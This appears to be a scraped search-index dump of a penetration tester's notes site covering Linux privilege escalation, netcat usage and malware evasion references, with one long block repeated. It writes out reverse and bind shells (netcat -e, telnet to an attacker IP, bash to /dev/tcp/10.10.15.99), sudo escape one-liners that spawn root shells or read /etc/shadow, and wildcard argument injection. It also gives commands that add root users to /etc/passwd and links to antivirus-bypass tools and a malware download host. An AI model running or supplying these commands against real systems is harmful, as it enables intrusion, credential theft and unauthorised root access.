https://www.exploit-db.com/exploits/33899 Connect to existing TMUX session: tmux - S / . devs / dev_sess \u200b Screenshot Need video group access Resolution: cat / sys / class / graphics / fb0 / virtual_size Video feed: Open \u200b / dev / fb0 \u200b in a image editor cp /dev/fb0 screenshot.raw iraw2png 1024 768 screenshot.raw screenshot.png fbdump https://www.kernel.org/doc/Documentation/fb/framebuffer.txt Important Groups shadow - can read /etc/shadow disk - raw access to files debugfs / dev / sda1 debugfs : cat /root/.ssh/i d_rsa debugfs : cat /etc/s hadow video - access to framebuffer cat / dev / fb0 / tmp / screen . raw cat / sys / class / graphics / fb0 / virtual_size root find / - group root - perm - g = w 2 / dev / null Hacking Linux Part I: Privilege Escalation: http://www.dankalia.com/tutor/01005/0100501004.htm Abusing users with '.' in their PATH Shell Escape Sequences IFS Exploit LD_PRELOAD Exploit Symlinks Find plain text username / password grep -i user [ filename ] grep -i pass [ filename ] grep -C 5 password [ filename ] find . -name *.php -print0 | xargs -0 grep -i -n var $password # Joomla Commands with sudo: sudo - l New file Permissions: umask Generate password hash (md5): openssl passwd - 1 echo joske | openssl passwd - 1 - stdin Generate password hash (sha256): python - c import crypt; print crypt.crypt( joske ) Add user with passwd echo user2:*:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd passwd user2 echo user2:`openssl passwd -1 -salt user3 pass123`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`mkpasswd -m SHA-512 pass`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`python -c import crypt; print crypt.crypt( pass , $6$salt ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`perl -le print crypt( pass123 , abc ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`php -r print ( crypt ( aarti , 123 ) . \\ \\n\\ ) ; `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd Add root user adduser username usermod -aG sudo username echo trevelyn::0:0:root:/root:/bin/bash /etc/passwd Change user password echo trevelyn:trevelyn | /usr/sbin/chpasswd References http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/ Linux Local Privilege Escalation via SUID /proc/pid/mem Write - https://git.zx2c4.com/CVE-2012-0056/about/ https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt Important Files GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions: https://gtfobins.github.io/ Files owned by User: find / - type f - uid 1000 - ls 2 / dev / null Environment variables: / proc / self / environ Email: / var / log / mail / USER Private keys: ~/ . ssh / id_rsa APT sources: / etc / apt / sources . list Order of name resolution: / etc / nsswitch . conf DNS Hosts File: / etc / hosts DNS sever Information: / etc / resolv . conf Kernel module config: / etc / sysctl . conf Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h Os Info: / etc / issue / proc / version Cron: / etc / crontab Bootloader - GRUB2 Main configuration file (replaces menu . lst in GRUB (v1)): / boot / grub / grub . cfg Directory contains the scripts that build the grub . cfg : / etc / grub . d 00 _header - Loads the settings from / etc / default / grub 05 _debian_theme - Defines the colors, background, etc. 10 _linux - Loads the menu entries 20 _memtest86 - Loads the memory tester 30 _os - prober - Scans the hard drives for other operating systems 40 _custom - Template for manually adding other menu entries File contains the GRUB menu settings: / etc / default / grub Run update - grub after modifying. Samba: / etc / samba / smb . conf Logs: Syslog: / etc / rsyslog . conf Log mail events of all priorities to /var/log/mail: mail . * / var / log / mail Log all events of the emergency priority (emerg) to all logged on users: .emerg Squid Proxy: / etc / squid / squid . conf / etc / squid / passwords Apache: / var / log / apache2 / access . log / etc / apache2 / sites - enabled / 000 - default . conf / etc / apache / sites - enabled / 000 - default . conf / etc / httpd / sites - enabled / 000 - default . conf TFTPD: / etc / default / tftpd - hpa PHP Sessions: / tmp / sess_ID / var / lib / php5 / sess_ID / etc / issue / proc / version / etc / profile / root / . bash_history / var / log / dmessage / var / mail / root / var / spool / cron / crontabs / root Passwords / etc / passwd / etc / shadow / etc / pwd . db / etc / passwd / etc / spwd . db / etc / shadow / etc / master . passwd Special File Handling 7z files Print file information: 7 z l - slt example . zip Extract: 7 z x example . zip Microsoft Outlook Personal Folder (PST) Examine: readpst - tea - m example . pst Defense References PAM vs NSS: https://serverfault.com/questions/538383/understand-pam-and-nss/ Support to authenticate against PostgreSQL for PAM-enabled appliations: https://github.com/pam-pgsql/pam-pgsql Point of no C3 | Linux Kernel Exploitation https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585 https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850 Tools Locally checks for signs of a rootkit: http://www.chkrootkit.org/ Checklists Linux hardening checklist: https://github.com/trimstray/linux-hardening-checklist Kernel hardning checklist: https://github.com/a13xp0p0v/kconfig-hardened-check","title":"Linux"},{"location":"linux/#quick-reference","text":"Bash cheatsheet: https://devhints.io/bash.html Archiving/compressing: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/","title":"Quick Reference"},{"location":"linux/#os-information","text":"System Information cat /proc/net/dev lspci ip link show ip addr show lscpu cat /proc/cpuinfo File information: file filename Shared library dependencies: ldd filename Searching: With database: updatedb ; locate sbd . exe Within PATH: which sbd whereis sdb Complex: find / -\u00ad\u2010name sbd* find / --name sdb* --exec file {} \\; Search for hidden (dot) files find / - type d - name .* Mounting Devices: mount -t filesystemtype location mount -t /dev/cdrom /media umount /dev/cdrom Distribution cat / etc / issue cat / etc /*-release cat /etc/lsb-release ### Debian based cat /etc/redhat-release ### Redhat based Kernel cat / proc / version uname - a uname - mrs rpm - q kernel dmesg | grep Linux ls / boot | grep vmlinuz - Kernel tuning Temporary: sysctl Permanent: / etc / sysctl . conf View configuration: sysctl - a | less View configuration files for the installed modprobe modules: ls - l / etc / modprobe . d / ls - R / lib / modules / $ ( uname - r ) / kernel Kernel Modules Insert module: insmod Remove module: modprobe - r rmmod List modules: modprobe - l lsmod Environment cat / etc / profile cat / etc / bashrc cat ~/ . bash_profile cat ~/ . bashrc cat ~/ . bash_logout env set Printers: lpstat - a Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h New line in command line $ echo abc[CTRL+M] def Change password (one liner): echo root : password | / usr / sbin / chpasswd Bash Variables: $ 0 - The name of the Bash script $ 1 - $9 - The first 9 arguments to the Bash script $ # - Number of arguments passed to the Bash script $ @ - All arguments passed to the Bash script $ ? - The exit status of the most recently run process $$ - The process ID of the current script $ USER - The username of the user running the script $ HOSTNAME - The hostname of the machine $ RANDOM - A random number $ LINENO - The current line number in the script","title":"OS Information"},{"location":"linux/#startup-process","text":"https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/ Run levels 0 - halt the system 1 - single user mode ( minimal services ) 2 - multi - user modes 3 - multi - user mode 4 - multi - user mode 5 - multi - user mode 6 - reboot the system Init.d Process Has process ID: 1 / etc / init . d scripts with 755 permission init process then hands over the boot-up processes to rc . d daemon rc.local - Script to start necessary processes in the background when the system boots up: / etc / init . d / rc . local","title":"Startup Process"},{"location":"linux/#daemons","text":"inetd , xinetd - Inetd always runs in the background and it then decides when to start and stop other daemons. rlinetd rlinetd . conf / etc / rlinetd . d Disable unnecessary demons Configure IPs that can access a demon","title":"Daemons"},{"location":"linux/#managing-disks","text":"Managing Hard Disks hda for hard disks. sda for newer SATA disks (SCSI). Partitions within sda are sda1 , sda2 , ... Basic disk Information: df - h Partitions on disk: fdsisk - l Block device information: lsblk Editing and displaying partitions: parted / cfdisk ( parted ) print ( parted ) select / dev / sdb Change HDD parameters: hdparm Debugfs Simple-to-use RAM-based file system specially designed for debugging purposes Mount file system (usable to access / root by only being in disk group) debugfs / dev / sda1","title":"Managing Disks"},{"location":"linux/#permissions","text":"File Permissions: 0 = No Permission 1 = Execute 2 = Write 4 = Read r w x 4 2 1 = 7 Setuid - Set User ID - The process's effective user ID gets set to that of the program file itself (rather than that of the user running it). S - just the setuid bit s - setuid bit and execute x Dir - No effect on DIRs Find SUID: find . - perm / 4000 Setgid - Set Group ID - The process's effective group ID gets set to that of the program file (rather than that of the user's primary group). Dir - any files created in that directory will have the same group as that directory http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html Find GUID: find . - perm / 2000 Find SUID / SGID: find . - perm / 6000 Find and ls SUID / SGID: find $DIRECTORY - perm / 6000 - exec ls - la {} \\ ; Searching world writable files: find / - perm - w ~ - type l - ls 2 ?/ dev / null Check file permissions of / etc / passwd and / etc / shadow Find writable files: find - type f - maxdepth 1 - writable","title":"Permissions"},{"location":"linux/#processes","text":"Running processes: ps aux ps - ef top Tree of processes (processes threads): pstree - aclp Process priority: nice - n - 20 command renice nice - value pid - 20 is highest priority 19 is lowest priority Memory map for a process: cat / proc / 1234 / maps gdb info proc mappings pmap - d 1234 / proc - / proc / id / environ environment variables - / proc / id / cmdline command line args/command used to run the process - / proc / id / maps memory map - / proc / id / fd open file descriptors Trace system and library calls ltrace strace Access control access - Check permissions for the UID and GID of the process (executable file owner / group) Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} )","title":"Processes"},{"location":"linux/#services","text":"List of Services: cat / etc / services Commons service configurations cat / etc / syslog . conf cat / etc / chttp . conf cat / etc / lighttpd . conf cat / etc / cups / cupsd . conf cat / etc / inetd . conf cat / etc / apache2 / apache2 . conf cat / etc / my . conf cat / etc / httpd / conf / httpd . conf cat / opt / lampp / etc / httpd . conf ls - aRl / etc / | awk $ 1 ~ /^ . * r . */ Check if certain service is up: update - \u00ad\u2010 rc . d ssh enable Auto start a service: update - \u00ad\u2010 rc . d ssh enable Systemd services: / lib / systemd / system / snapd . service Systemd socket unit file: [Socket] ListenStream = /run/snapd.socket ListenStream = /run/snapd-snap.socket SocketMode = 0666 0666 - Allow any process to connect and communicate with the socket.","title":"Services"},{"location":"linux/#networking","text":"Interface Information / sbin / ifconfig - a cat / etc / network / interfaces cat / etc / sysconfig / network Network configuration cat / etc / resolv . conf cat / etc / sysconfig / network cat / etc / networks iptables - L hostname dnsdomainname Monitor network communication lsof - i lsof - i : 80 grep 80 / etc / services netstat - antup netstat - antpx netstat - tulpn chkconfig --list chkconfig --list | grep 3:on last w Cached IP and Mac Information arp - e route / sbin / route - nee Change IP ifconfig eth0 192 . 168 . 1 . 115 ifconfig eth0 192 . 168 . 1 . 115 netmask 255 . 255 . 255 . 0 broadcast 192 . 168 . 1 . 255 Shell with built-in tools nc - lvp 4444 ### Attacker . Input ( Commands ) nc - lvp 4445 ### Attacker . Ouput ( Results ) telnet [ atackers ip ] 44444 | / bin / sh | [ local ip ] 44445 ### On the targets system . Use the attackers IP ! https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ AF_UNIX - Used to communicate between processes on the same machine AF_INET and AF_INET6 - Used for processes to communicate over a network connection. Interact with AF_UNIX Socket nc - U / run / snapd . socket GET / HTTP / 1 . 1 Host : 127 . 0 . 0 . 1 Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} ) Tools Ship - one-stop-shop for basic network reconnaissance and addressing: https://github.com/xtonousou/ship.git https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/","title":"Networking"},{"location":"linux/#tools","text":"grep Color word root: grep --color root /etc/passwd OR: grep - e how - e to - e forge * . txt https://www.howtoforge.com/tutorial/linux-grep-command/ Option Details - i Ignore case - r - R Recursive grep - R example / etc / apache2 / - w Match words - e Regex match grep - w - e word1|word2 / path / to / file - n Line number - c Count - v Invert - x Exact match - l File names with match - L File names without match iptables count packets sent and received iptables - Z iptables - F iptables - I INPUT 1 - s IP - j ACCEPT iptables - I OUTOUT 1 - d IP - j ACCEPT ip tables - vn - L Netcat Chat nc - nlvp 4444 nc - nv ip 4444 File Transfer nc - nlvp 4444 file . exe nc - nv ip 4444 file . exe Bind Shell VICTIM (server): nc - lvp 4444 - e cmd . exe ATTACKER (client): nc - nv IP Address 4444 Reverse Shell ATTACKER (server): nc - lvp 4444 VICTIM (client): nc - nv IP Address 4444 - e cmd . exe NCAT for increased security VICTIM (server): ncat - lvp 4444 - e cmd . exe --allow 192.168.30.5 --ssl ATTACKER (client): ncat - nv IP Address 4444 --ssl Port Scanning TCP Connect Port Scan: nc - nvv - w 1 - z ip 1 - 65550 UDP Scan: nc - unvv - w 1 - z ip 1 - 65550 tcpdump Packet Capture tcpdump tcp dst [ ip ] [ port ] and tcp dst [ ip ] [ port ] tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 Open a PCAP: tcpdump - \u00ad r password_cracking_filtered . pcap Cut only IP addresses from the traffic: tcpdump - \u00ad r password_cracking_filtered . pcap | awk - \u00ad\u2010 F {print $3} | sort - \u00ad\u2010 u | head Filter Destination or Source tcpdump - n src host ip - \u00ad r password_cracking_filtered . pcap tcpdump - n dst host ip \u2010 r password_cracking_filtered . pcap tcpdump - n port port - \u00ad r password_cracking_filtered . pcap Advanced Header Filtering: tcpdump - A - n tcp[13] = 24 - \u00ad\u2010 r password_cracking_filtered . pcap Other important flags - nn stop DNS and service names lookup (performance+) - X and - XX can be used to print each packet in hex and ascii - A print packets in ASCII - S to print absolute sequence numbers - s can be used to increase the default snap-length from 262144 to higher - s 0 to capture full packet References: https://hackertarget.com/tcpdump-examples/","title":"Tools"},{"location":"linux/#general-exploits","text":"Enumeration Scripts BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux unix-privesc-check: https://github.com/pentestmonkey/unix-privesc-check linuxprivchecker.py: http://www.securitysift.com/download/linuxprivchecker.py LinEnum: https://github.com/rebootuser/LinEnum Lse.sh: https://github.com/diego-treitos/linux-smart-enumeration LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite Escape shell Information about environment: env echo $ PATH echo / usr / local / rbin /* List read only variables (check If PATH or SHELL is writable): export - p VI / VIM: : set shell =/ bin / bash : shell : sh | : ! / bin / bash | : r / root / root . txt | : e / root / root . txt AWK: awk BEGIN {system( /bin/sh )} Find: find / - name blahblah - exec / bin / awk BEGIN {system( /bin/sh )} \\ ; More / Less / Man: ! / bin / sh !/ bin / sh !bash Tee: echo evil script code | tee script . sh Languages python: exit_code = os.system ( /bin/sh ) output = os.popen ( /bin/sh ) .read () perl -e exec /bin/sh ; perl: exec /bin/sh ; ruby: exec /bin/sh lua: os.execute ( /bin/sh ) irb ( main:001:0 exec /bin/sh Copy files into $ PATH Copy file into HOME (scp/ftp) Some restricted shells will start by running some files in an unrestricted mode (If your .bash_profile is executed in an restricted mode and it's editable) If HISTFILE and HISTSIZE are writable: Set HISTFILE to the file you want to overwrite (preferably an executable) Set HISTSIZE to 0 and then back to 100, Then execute the lines you want in your shell script https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ Wildcards Char Description * Any number of characters, including none. ? Any single character. [ ] Set of characters, any one of which may match a single character at that position. - Used within [ ] denotes a range of characters. ~ At the beginning of a word expands to the name of your home directory. If you append another user's login name to the character, it refers to that user's home directory. Using wildcard to inject arguments # ls -al drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR1 drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR2 -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file1.txt -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file2.txt -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # rm * # ls -al -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # strace rm * execve ( /bin/rm , [ rm , DIR1 , DIR2 , file1.txt , file2.txt , -rf ] , [ /* 25 vars */ ]) = 0 chown --reference=RFILE use RFILE s owner and group rather than specifying OWNER : GROUP values # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php # chown -R nobody:nobody *.php # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 leon leon 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 leon leon 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php chmod --reference = RFILE use RFILE s mode instead of MODE values # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php # chmod 000 * # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rwxrwxrwx. 1 user user 117 Oct 28 17 :36 inc.php -rwxrwxrwx. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php tar command Execution --checkpoint [= NUMBER ] display progress messages every NUMBERth record ( default 10 ) --checkpoint-action = ACTION execute ACTION on each checkpoint # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 19 :19 --checkpoint = 1 -rw-r--r--. 1 leon leon 0 Oct 28 19 :17 --checkpoint-action = exec = sh shell.sh -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 12 Oct 28 19 :17 shell.sh # tar cf archive.tar * uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Rcync command Execution -e, --rsh = COMMAND specify the remote shell to use --rsync-path = PROGRAM specify the rsync to run on remote machine # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c # rsync -t *.c foo:src/ rsync: connection unexpectedly closed ( 0 bytes received so far ) [ sender ] rsync error: error in rsync protocol data stream ( code 12 ) at io.c ( 601 ) [ sender = 3 .0.8 ] # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c -rw-r--r--. 1 root root 101 Mar 28 04 :49 shell_output.txt # cat shell.c /usr/bin/id shell_output.txt # cat shell_output.txt uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Practice HTB - Joker Create a script, setuid bit and then use this attack to chown the script to gain prev-esc Exploits Related to Tools Tar: sudo tar - cf / dev / null / dev / null -- checkpoint = 1 -- checkpoint - action = exec =/ bin / bash echo -e #!/bin/bash\\n\\nbash -i /dev/tcp/10.10.15.99/8082 0 1 a.sh tar -cvf a.tar a.sh sudo tar -xvf a.tar --to-command /bin/bash Zip: sudo zip / tmp / test . zip / tmp / test - T --unzip-command= sh -c /bin/bash Strace: sudo strace - o / dev / null / bin / bash tcpdump echo $\u2019id \\n cat /etc/shadow\u2019 /tmp/.shell chmod +x /tmp/.shell sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root nmap echo os.execute( /bin/sh ) / tmp / shell . nse sudo nmap --script=/tmp/shell.nse scp: sudo scp - S / path / yourscript x y except: sudo except spawn sh then sh nano: sudo nano - S / bin / bash type your command and hit CTRL+T git: sudo git help status type: !/bin/bash gdb/ftp: sudo ftp type : !/bin/sh Other File execution due to not using quotes # Files in `SLAPPER_FILES` list will get executed: for i in ${ SLAPPER_FILES } ; do if [ -f ${ i } ] ; then file_port = $file_port $i # Correction: file_port= $file_port $i STATUS = 1 fi done Ref: https://www.exploit-db.com/exploits/33899 Connect to existing TMUX session: tmux - S / . devs / dev_sess \u200b Screenshot Need video group access Resolution: cat / sys / class / graphics / fb0 / virtual_size Video feed: Open \u200b / dev / fb0 \u200b in a image editor cp /dev/fb0 screenshot.raw iraw2png 1024 768 screenshot.raw screenshot.png fbdump https://www.kernel.org/doc/Documentation/fb/framebuffer.txt Important Groups shadow - can read /etc/shadow disk - raw access to files debugfs / dev / sda1 debugfs : cat /root/.ssh/i d_rsa debugfs : cat /etc/s hadow video - access to framebuffer cat / dev / fb0 / tmp / screen . raw cat / sys / class / graphics / fb0 / virtual_size root find / - group root - perm - g = w 2 / dev / null Hacking Linux Part I: Privilege Escalation: http://www.dankalia.com/tutor/01005/0100501004.htm Abusing users with '.' in their PATH Shell Escape Sequences IFS Exploit LD_PRELOAD Exploit Symlinks Find plain text username / password grep -i user [ filename ] grep -i pass [ filename ] grep -C 5 password [ filename ] find . -name *.php -print0 | xargs -0 grep -i -n var $password # Joomla Commands with sudo: sudo - l New file Permissions: umask Generate password hash (md5): openssl passwd - 1 echo joske | openssl passwd - 1 - stdin Generate password hash (sha256): python - c import crypt; print crypt.crypt( joske ) Add user with passwd echo user2:*:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd passwd user2 echo user2:`openssl passwd -1 -salt user3 pass123`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`mkpasswd -m SHA-512 pass`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`python -c import crypt; print crypt.crypt( pass , $6$salt ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`perl -le print crypt( pass123 , abc ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`php -r print ( crypt ( aarti , 123 ) . \\ \\n\\ ) ; `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd Add root user adduser username usermod -aG sudo username echo trevelyn::0:0:root:/root:/bin/bash /etc/passwd Change user password echo trevelyn:trevelyn | /usr/sbin/chpasswd References http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/ Linux Local Privilege Escalation via SUID /proc/pid/mem Write - https://git.zx2c4.com/CVE-2012-0056/about/ https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt","title":"General Exploits"},{"location":"linux/#important-files","text":"GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions: https://gtfobins.github.io/ Files owned by User: find / - type f - uid 1000 - ls 2 / dev / null Environment variables: / proc / self / environ Email: / var / log / mail / USER Private keys: ~/ . ssh / id_rsa APT sources: / etc / apt / sources . list Order of name resolution: / etc / nsswitch . conf DNS Hosts File: / etc / hosts DNS sever Information: / etc / resolv . conf Kernel module config: / etc / sysctl . conf Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h Os Info: / etc / issue / proc / version Cron: / etc / crontab Bootloader - GRUB2 Main configuration file (replaces menu . lst in GRUB (v1)): / boot / grub / grub . cfg Directory contains the scripts that build the grub . cfg : / etc / grub . d 00 _header - Loads the settings from / etc / default / grub 05 _debian_theme - Defines the colors, background, etc. 10 _linux - Loads the menu entries 20 _memtest86 - Loads the memory tester 30 _os - prober - Scans the hard drives for other operating systems 40 _custom - Template for manually adding other menu entries File contains the GRUB menu settings: / etc / default / grub Run update - grub after modifying. Samba: / etc / samba / smb . conf Logs: Syslog: / etc / rsyslog . conf Log mail events of all priorities to /var/log/mail: mail . * / var / log / mail Log all events of the emergency priority (emerg) to all logged on users: .emerg Squid Proxy: / etc / squid / squid . conf / etc / squid / passwords Apache: / var / log / apache2 / access . log / etc / apache2 / sites - enabled / 000 - default . conf / etc / apache / sites - enabled / 000 - default . conf / etc / httpd / sites - enabled / 000 - default . conf TFTPD: / etc / default / tftpd - hpa PHP Sessions: / tmp / sess_ID / var / lib / php5 / sess_ID / etc / issue / proc / version / etc / profile / root / . bash_history / var / log / dmessage / var / mail / root / var / spool / cron / crontabs / root Passwords / etc / passwd / etc / shadow / etc / pwd . db / etc / passwd / etc / spwd . db / etc / shadow / etc / master . passwd","title":"Important Files"},{"location":"linux/#special-file-handling","text":"7z files Print file information: 7 z l - slt example . zip Extract: 7 z x example . zip Microsoft Outlook Personal Folder (PST) Examine: readpst - tea - m example . pst","title":"Special File Handling"},{"location":"linux/#defense","text":"References PAM vs NSS: https://serverfault.com/questions/538383/understand-pam-and-nss/ Support to authenticate against PostgreSQL for PAM-enabled appliations: https://github.com/pam-pgsql/pam-pgsql Point of no C3 | Linux Kernel Exploitation https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585 https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850 Tools Locally checks for signs of a rootkit: http://www.chkrootkit.org/ Checklists Linux hardening checklist: https://github.com/trimstray/linux-hardening-checklist Kernel hardning checklist: https://github.com/a13xp0p0v/kconfig-hardened-check","title":"Defense"},{"location":"malware/","text":"Malware Analysis Malware Families https://malpedia.caad.fkie.fraunhofer.de/families AlphaBlend Campaign https://steemit.com/reverse/@utkonos/alphablend-malware https://steemit.com/reverseengineering/@utkonos/alphablend-campaign-part-2 https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address https://docs.microsoft.com/en-us/windows/desktop/sbscs/activation-contexts azorult https://blog.minerva-labs.com/azorult-now-as-a-signed-google-update MuddyWater https://www.sdkhere.com/2019/01/a-new-muddywater-apt-campaign-spreads.html Collections Linux https://github.com/tarcisio-marinho/GonnaCry Malware Collections http://iec56w4ibovnb4wc.onion/ http://iec56w4ibovnb4wc.onion.si https://www.cert.pl/en/news/single/mwdb-our-way-to-share-information-about-malicious-software/ http://185.244.25.217/bins/ Collection Maintenance Tools https://github.com/phage-nz/ph0neutria https://github.com/robbyFux/Ragpicker Antivirus Bypass Tools shellterproject: https://www.shellterproject.com/exclusive-features/ Hyperion i586 - mingw32 - msvc - g ++ Src / Crypter /*.cpp -o hyperion.exe wine hyperion.exe backdoor.exe out.exe Python script designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil Python script that takes an automated approach to AV evasion: https://github.com/v-p-b/peCloakCapstone/blob/master/peCloak.py Open source software in Python language which lets you generate customized shellcodes and convert scripts to an obfuscated script: https://www.owasp.org/index.php/OWASP%5FZSC%5FTool%5FProject References Art of Anti Detection 1 \u2013 Introduction to AV Detection Techniques: https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/ Art of Anti Detection 2 \u2013 PE Backdoor Manufacturing: https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/ 5 Common Cyber Security Threats That Bypass Legacy AV: https://www.sentinelone.com/blog/5-common-cyber-security-threats-that-bypass-legacy-av/ Antivirus Event Analysis Cheat Sheet v1.4: https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ Bypassing Kaspersky Endpoint Security 11: http://0xc0ffee.io/blog/kes11-bypass Hiding Metasploit Shellcode to Evade Windows Defender: https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/ Enumerating Anti-Sandboxing Techniques - TrustedSec: https://www.trustedsec.com/2018/06/enumerating-anti-sandboxing-techniques/?utm_content=73303714 utm_medium=social utm_source=twitter Techniques PDF Based BadPDF - Bad-Pdf reads the NTLM hashes using Responder listener: https://github.com/deepzec/Bad-Pdf Adobe Reader - PDF callback via XSLT stylesheet in XFA: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html C2 Techniques dnscat2 - https : // github . com / iagox86 / dnscat2 DropboxC2C - https : // github . com / 0 x09AL / DropboxC2C gcat (Gmail) - https : // github . com / byt3bl33d3r / gcat HTTP/2 Go - https : // github . com / Ne0nd0g / merlin Downloaders PLEAD Downloader Used by BlackTech: https://blogs.jpcert.or.jp/en/2018/06/plead-downloader-used-by-blacktech.html Fileless Attacks New Reference https://www.varonis.com/blog/understanding-malware-free-hacking-part/ Summarized References https://blog.minerva-labs.com/deconstructing-fileless-attacks-into-4-underlying-techniques Malicious Documents New Evasive Malware Technique exploits Microsoft Dynamic Exchange (DDE): https://blog.minerva-labs.com/prevented-by-minerva-labs-new-evasive-malware-technique-exploits-microsoft-dynamic-exchange Dynamic Data Exchange (DDE) allows adversaries to deliver stealthy payloads via document files while avoiding the common usage of macro. https://blogs.quickheal.com/emerging-trend-dde-based-office-malware-analysis-quick-heal-security-labs/ https://blog.barkly.com/locky-ransomware-using-microsoft-office-dde-exploit Malicious Scripts Targeting powershell.exe, cscript.exe, cmd.exe and mshta.exe Windows Subsystem for Linux introduce more script support Prevent Powershell detection: https://blog.minerva-labs.com/confronting-snake-oil-sales-tactics-in-endpoint-security If the attacker places a malicious script under the path %USERPROFILE%\\profile.ps1 and start PowerShell ISE, the script will be executed without powershell.exe being involved Bypass execution policy: HKEY_CURRENT_USER\\Software\\MicrosoftPowerShell\\1\\ShellIds\\Microsoft.PowerShell - And set the registry value ExecutionPolicy to Unrestricted. Invoke-NoShell 12 different evasive document permutations Invoke-Obfuscation Invoke-DOSfuscation Emotet\u2019s script obfuscation: https://blog.minerva-labs.com/the-emotet-grinch-is-back Living off the Land regsvr32.exe, rundll32.exe, certutil.exe and schtasks.exe. Living Off The Land Binaries and Scripts: 